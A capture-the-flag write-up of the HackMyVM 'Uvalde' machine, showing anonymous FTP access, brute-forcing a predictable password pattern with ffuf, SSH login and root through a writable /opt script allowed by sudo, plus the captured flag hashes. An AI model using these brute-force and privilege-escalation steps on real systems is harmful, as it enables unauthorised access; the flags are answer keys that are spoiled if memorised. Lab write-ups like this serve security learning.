# Uvalde

## Recon

::: details nmap_scan.log.md
```log

```
:::

## FTP

```bash
└─$ ftp anonymous@10.0.2.188
ftp> ls
-rw-r--r--    1 1000     1000         5154 Jan 28  2023 output
ftp> cd output
550 Failed to change directory.
ftp> get output
226 Transfer complete.
ftp> put nmap_scan_10.0.2.188
550 Permission denied.
ftp> exit
221 Goodbye.
```

```bash
└─$ cat output
Script démarré sur 2023-01-28 19:54:05+01:00 [TERM="xterm-256color" TTY="/dev/pts/0" COLUMNS="105" LINES="25"]
matthew@debian:~$ id
uid=1000(matthew) gid=1000(matthew) groupes=1000(matthew)
matthew@debian:~$ ls -al
total 32
drwxr-xr-x 4 matthew matthew 4096 28 janv. 19:54 .
drwxr-xr-x 3 root    root    4096 23 janv. 07:52 ..
lrwxrwxrwx 1 root    root       9 23 janv. 07:53 .bash_history -> /dev/null
-rw-r--r-- 1 matthew matthew  220 23 janv. 07:51 .bash_logout
-rw-r--r-- 1 matthew matthew 3526 23 janv. 07:51 .bashrc
drwx------ 3 matthew matthew 4096 23 janv. 08:04 .config
drwxr-xr-x 3 matthew matthew 4096 23 janv. 08:04 .local
-rw-r--r-- 1 matthew matthew  807 23 janv. 07:51 .profile
-rw-r--r-- 1 matthew matthew    0 28 janv. 19:54 typescript
-rwx------ 1 matthew matthew   33 23 janv. 07:53 user.txt
matthew@debian:~$ toilet -f mono12 -F metal hackmyvm.eu
...
```

## HTTP

![writeup.png](/assets/pentest/hackmyvm/uvalde/writeup.png)

```bash
└─$ feroxbuster -u http://10.0.2.188 --thorough -C 404,400,414,500 --dont-scan .css,.png,.jpeg,.jpg,.gif,.woff2,.woff,.ttf,.svg,.min.js -n -w /usr/share/seclists/Discovery/Web-Content/common.txt -x .php
200      GET      937l     2655w    37173c http://10.0.2.188/js/jqBootstrapValidation.js
200      GET       47l       95w     1003c http://10.0.2.188/create_account.php
200      GET       75l      244w     2807c http://10.0.2.188/js/contact_me.js
200      GET      714l     2076w    29604c http://10.0.2.188/
301      GET        9l       28w      306c http://10.0.2.188/img => http://10.0.2.188/img/
200      GET      714l     2076w    29604c http://10.0.2.188/index.php
301      GET        9l       28w      305c http://10.0.2.188/js => http://10.0.2.188/js/
200      GET       60l      103w     1022c http://10.0.2.188/login.php
301      GET        9l       28w      307c http://10.0.2.188/mail => http://10.0.2.188/mail/
200      GET       50l       96w     1393c http://10.0.2.188/package.json
200      GET     6378l    11619w   266039c http://10.0.2.188/package-lock.json
302      GET        0l        0w        0c http://10.0.2.188/success.php => login.php
302      GET        0l        0w        0c http://10.0.2.188/user.php => login.php
301      GET        9l       28w      309c http://10.0.2.188/vendor => http://10.0.2.188/vendor/
```

```bash
└─$ curl 'http://10.0.2.188/create_account.php' -d 'username=test01' -i
HTTP/1.1 302 Found
Date: Mon, 12 Jan 2026 22:07:27 GMT
Server: Apache/2.4.54 (Debian)
Set-Cookie: UserName=registred; expires=Mon, 12-Jan-2026 23:07:27 GMT; Max-Age=3600
Location: success.php?dXNlcm5hbWU9dGVzdDAxJnBhc3N3b3JkPXRlc3QwMTIwMjZAMTU3MA==
...

└─$ base64 -d <<<dXNlcm5hbWU9dGVzdDAxJnBhc3N3b3JkPXRlc3QwMTIwMjZAMTU3MA==
username=test01&password=test012026@1570
```

Account activation link uses `username` + `password` (but actually username) + `year` + `@` + `????`
```bash
username=test01
password=test01
2026@1570
```

`/login.php` doesn't seem to do anything with newly created credentials.

Wait! Password is `test012026@1570` it was not random junk, but autogenerated.

```bash
└─$ ffuf -u 'http://10.0.2.188/login.php' -d 'username=matthew&password=matthew2026@FUZZ' -w <(seq -w 1 9999) -H 'Content-Type: application/x-www-form-urlencoded' -mc 302
# Nothing
```

The box was released in 2023, try 2023 as year?
```bash
└─$ ffuf -u 'http://10.0.2.188/login.php' -d 'username=matthew&password=matthew2023@FUZZ' -w <(seq -w 1 9999) -H 'Content-Type: application/x-www-form-urlencoded' -mc 302
1554                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 52ms]
```

> Creds: `matthew:matthew2023@1554`

![writeup-1.png](/assets/pentest/hackmyvm/uvalde/writeup-1.png)

## SSH

```bash
└─$ sshpass -p 'matthew2023@1554' ssh matthew@10.0.2.188
matthew@uvalde:~$ id
uid=1000(matthew) gid=1000(matthew) groups=1000(matthew)
```

### User.txt

```bash
matthew@uvalde:~$ cat user.txt
6e4136fbed8f8c691996dbf42697d460
```

## Privilege Escalation

```bash
matthew@uvalde:~$ sudo -l
Matching Defaults entries for matthew on uvalde:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User matthew may run the following commands on uvalde:
    (ALL : ALL) NOPASSWD: /bin/bash /opt/superhack
```

```bash
matthew@uvalde:~$ ls -la /opt
total 12
drwx---rwx  2 root root 4096 Feb  5  2023 .
drwxr-xr-x 18 root root 4096 Jan 22  2023 ..
-rw-r--r--  1 root root 1594 Jan 31  2023 superhack
```

```bash
matthew@uvalde:~$ cat /opt/superhack
#!/bin/bash
clear -x

GRAS=$(tput bold)
JAUNE=$(tput setaf 3)$GRAS
BLANC=$(tput setaf 7)$GRAS
BLEU=$(tput setaf 4)$GRAS
VERT=$(tput setaf 2)$GRAS
ROUGE=$(tput setaf 1)$GRAS
RESET=$(tput sgr0)

printf "${BLANC}Tool:${RESET} ${BLEU}superHack${RESET}n"
printf "${BLANC}Author:${RESET} ${BLEU}hackerman${RESET}n"
printf "${BLANC}Version:${RESET} ${BLEU}1.0${RESET}n"

printf "n"

[[ $# -ne 0 ]] && echo -e "${BLEU}Usage:${RESET} $0 domain" && exit

while [ -z "$domain" ]; do
    read -p "${VERT}domain to hack:${RESET} " domain
done

printf "n"

n=50

string=""
for ((i = 0; i < $n; i)); do
    string ="."
done

for ((i = 0; i < $n; i)); do
    string="${string/./#}"
    printf "${BLANC}Hacking progress...:${RESET} ${BLANC}[$string]${RESET}r"
    sleep .09
done

printf "n"
printf "${JAUNE}Target $domain ====> PWNED${RESET}n"
printf "${JAUNE}URL: https://$domain/*********************.php${RESET}n"

echo -e "n${ROUGE}Pay 0.000047 BTC to 3FZbgi29cpjq2GjdwV8eyHuJJnkLtktZc5 to unlock backdoor.${RESET}n"
```

Nice backdoor... but the `/opt` directory is writeable!

```bash
matthew@uvalde:/opt$ cp superhack superhack.bak
matthew@uvalde:/opt$ echo '/bin/bash -p' > superhack
-bash: superhack: Permission denied
matthew@uvalde:/opt$ rm -f superhack
matthew@uvalde:/opt$ echo '/bin/bash -p' > superhack
matthew@uvalde:/opt$ sudo bash /opt/superhack
root@uvalde:/opt# id
uid=0(root) gid=0(root) groups=0(root)
```

### Root.txt

```
root@uvalde:/opt# cat /root/root.txt
59ec54537e98a53691f33e81500f56da
```